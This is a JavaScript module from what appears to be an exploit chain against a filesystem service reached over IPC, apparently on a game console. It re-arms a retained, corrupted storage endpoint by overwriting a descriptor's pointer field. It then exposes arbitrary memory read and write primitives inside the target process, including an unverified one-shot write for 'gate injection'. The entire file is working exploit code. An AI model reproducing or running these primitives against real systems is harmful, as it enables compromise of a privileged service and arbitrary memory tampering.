// kaiHEN port — re-arm the retained two-bucket endpoint from the candidate
// IStorage handle and expose FS-memory read/write primitives.
//
// The control bucket is storage offset 0 (the owned cache array) and the data
// bucket is offset 0x4000; the data descriptor lives in the control bucket at
// dataEntryOffset and its pointer field at +0x20 selects the mapped address.
// CivSwitchFS's promotion installs exactly this layout and keeps the candidate
// IStorage open, so a follow-up payload can re-arm it with plain IPC.

import runtime from "../core/runtime.mjs";
import {check, khLog, hex, bytesEqual, u64Bytes, readU64LE, readU32LE,
    readNative, writeNative} from "./state.mjs";

const {ipcStorageRead, ipcStorageWrite, allocPage} = runtime;

const DATA_OFF = 0x4000;
const DATA_ENTRY = 0x90;
const ARRAY_LEN = 0x5a0;

// Live-endpoint pin: late-run reads observed context.ep reading armed and
// unarmed with no intervening await (runs 119-129 — heap interference
// suspected). The stage-1 ep object is remembered here; readFs/writeFs fall
// back to it when context.ep looks disarmed.
let LIVE_EP = null;
export function liveEndpoint() {
    return LIVE_EP;
}


export async function armEndpoint(context) {
    const saved = context.state.endpoint;
    check(saved && Number.isSafeInteger(saved.array) && Number.isSafeInteger(saved.owner),
        "retained endpoint snapshot is missing from fsKaihen");
    const ep = {
        array: saved.array, owner: saved.owner,
        arrayLength: saved.arrayLength || ARRAY_LEN,
        dataOffset: saved.dataOffset || DATA_OFF,
        dataEntryOffset: saved.dataEntryOffset || DATA_ENTRY,
        pointer: 0, armed: false
    };
    ep.readBuf = allocPage(0x1000);
    ep.writeBuf = allocPage(0x1000);

    async function storageRead(offset, length, stage) {
        const reply = ipcStorageRead(context.candidateHandle, BigInt(offset),
            length, ep.readBuf);
        check(reply.transport === 0 && reply.error === 0,
            stage + " control read failed transport=" + hex(reply.transport || 0) +
            " result=" + hex(reply.error || 0));
        return readNative(ep.readBuf, length);
    }

    async function storageWrite(offset, bytes, stage) {
        writeNative(ep.writeBuf, bytes);
        const reply = ipcStorageWrite(context.candidateHandle, BigInt(offset),
            ep.writeBuf, bytes.length);
        check(reply.transport === 0 && (reply.error === 0 || reply.error === undefined),
            stage + " control write failed transport=" + hex(reply.transport || 0) +
            " result=" + hex(reply.error || 0));
    }

    ep.controlRead = (offset, length) =>
        storageRead(offset, length, "endpoint");
    ep.controlWrite = async (offset, bytes) => {
        await storageWrite(offset, bytes, "endpoint");
        const observed = await storageRead(offset, bytes.length, "endpoint readback");
        check(bytesEqual(observed, bytes), "endpoint control write readback differs");
    };
    // setPointer (used below) goes through the raw storage calls.
    ep.storageRead = storageRead;
    ep.storageWrite = storageWrite;

    // Verify the canonical two-bucket layout. Entry 0's flags and pointer are
    // server-normalized after promotion (observed live: flags 0,1,1 at 0x10,
    // pointer 0 — promotion's own canonical check only pins u64@0/u64@8), so
    // the head check matches exactly what promotion guarantees: the recognized
    // array head {0, 0x4000}. The DATA entry at 0x90 stays strict
    // (setRetainedPointer enforces {0x4000, 0x4000, 1,1,1, pointer} live).
    const head = await storageRead(0, 0x30, "endpoint head");
    const entry = await storageRead(ep.dataEntryOffset, 0x30, "endpoint entry");
    check(readU64LE(head, 0) === 0n && readU64LE(head, 8) === 0x4000n,
        "control bucket is not the recognized owned array (head=" +
            JSON.stringify(head.slice(0, 0x18)) + ")");
    check(readU64LE(entry, 0) === BigInt(ep.dataOffset) &&
        readU64LE(entry, 8) === 0x4000n &&
        entry[0x10] === 1 && entry[0x11] === 1 && entry[0x12] === 1,
        "data descriptor differs from canonical: " +
            JSON.stringify(entry.slice(0, 0x30)));
    const pointer = readU64LE(entry, 0x20);
    check(pointer >= 0x100000000n && pointer < 0x8000000000n,
        "data descriptor pointer is not canonical: " + hex(pointer));
    ep.pointer = Number(pointer);

    // Verify the owner still carries the zero-count layout we left it in.
    await khLog("AM1 owner retarget");
    await setPointer(ep, ep.owner, "arm-owner");
    const owner = await storageRead(ep.dataOffset, 0x78, "endpoint owner");
    check(readU64LE(owner, 0x48) === BigInt(ep.array) &&
        readU64LE(owner, 0x50) === 0x5a0n && readU32LE(owner, 0x58) === 0 &&
        readU64LE(owner, 0x60) === 14n,
        "retained owner layout changed (array/owner fields differ)");

    // Leave the data descriptor back on the canonical self-target.
    await khLog("AM2 canonical retarget");
    await setPointer(ep, ep.array, "arm-canonical");
    ep.armed = true;
    LIVE_EP = ep;
    context.ep = ep;
    await khLog("endpoint re-armed array=" + hex(ep.array) +
        " owner=" + hex(ep.owner));
    return ep;
}

async function setPointer(ep, address, stage) {
    const bytes = await ep.storageRead(ep.dataEntryOffset, 0x30, "setPointer");
    check(readU64LE(bytes, 0) === BigInt(ep.dataOffset) &&
        readU64LE(bytes, 8) === 0x4000n && bytes[0x10] === 1,
        "retained data descriptor changed under us");
    if (address === ep.pointer) return;
    const target = u64Bytes(BigInt(address));
    await ep.storageWrite(ep.dataEntryOffset + 0x20, target,
        (stage || "setPointer") + " write");
    const observed = await ep.storageRead(ep.dataEntryOffset + 0x20, 8,
        (stage || "setPointer") + " readback");
    check(bytesEqual(observed, target),
        "retained pointer readback differs");
    ep.pointer = address;
}

function validAddress(address, length) {
    return Number.isSafeInteger(address) && address >= 0x100000000 &&
        address + length < 0x8000000000;
}

function armedEndpoint(context) {
    const ep = context.ep;
    if (ep && ep.armed) return ep;
    if (LIVE_EP && LIVE_EP.armed) return LIVE_EP;   // the pin beats the flip
    return ep;
}

export async function readFs(context, address, length) {
    const ep = armedEndpoint(context);
    check(ep && ep.armed, "endpoint is not armed");
    check(Number.isInteger(length) && length > 0 && length <= 0x600000 &&
        validAddress(address, length), "invalid FS read range " + hex(address) + "+" + length);
    const parts = [];
    for (let at = 0; at < length; at += 0x4000) {
        await setPointer(ep, address + at);
        parts.push(await ep.storageRead(ep.dataOffset,
            Math.min(0x4000, length - at), "readFs"));
    }
    let out = [];
    for (const part of parts) out = out.concat(part);
    return out;
}

export async function writeFs(context, address, bytes) {
    const ep = armedEndpoint(context);
    check(ep && ep.armed, "endpoint is not armed");
    check(bytes.length > 0 && bytes.length <= 0x600000 &&
        validAddress(address, bytes.length), "invalid FS write range");
    for (let at = 0; at < bytes.length; at += 0x4000) {
        const part = bytes.slice(at, at + 0x4000);
        await setPointer(ep, address + at);
        await ep.storageWrite(ep.dataOffset, part, "writeFs");
        const observed = await ep.storageRead(ep.dataOffset, part.length, "writeFs readback");
        check(bytesEqual(observed, part), "FS write readback differs at " + hex(address + at));
    }
}

// One-shot unverified write (bounded): used when a readback would consume a
// wake (gate injection). The caller keeps its own restoration path.
export async function writeFsUnverified(context, address, bytes) {
    const ep = armedEndpoint(context);
    check(ep && ep.armed && bytes.length > 0 && bytes.length <= 0x100 &&
        validAddress(address, bytes.length), "invalid unverified FS write");
    await setPointer(ep, address);
    await ep.storageWrite(ep.dataOffset, bytes, "writeFsUnverified");
}

// Verified compare-and-write against live bytes (reference Memory.write).
export async function compareWriteFs(context, address, expected, replacement) {
    check(expected.length === replacement.length && expected.length > 0 &&
        expected.length <= 0x100, "compare write needs equal bounded bytes");
    const before = await readFs(context, address, expected.length);
    check(bytesEqual(before, expected), "expected FS bytes differ at " + hex(address));
    await writeFs(context, address, replacement);
    const after = await readFs(context, address, replacement.length);
    check(bytesEqual(after, replacement), "exact FS readback differs at " + hex(address));
    return true;
}

export async function fsU64(context, address) {
    return readU64LE(await readFs(context, address, 8), 0);
}

export async function fsU32(context, address) {
    return readU32LE(await readFs(context, address, 4), 0);
}

export async function fsPointer(context, address) {
    const value = await fsU64(context, address);
    check(value >= 0x100000000n && value < 0x8000000000n,
        "noncanonical FS pointer at " + hex(address) + ": " + hex(value));
    return Number(value);
}
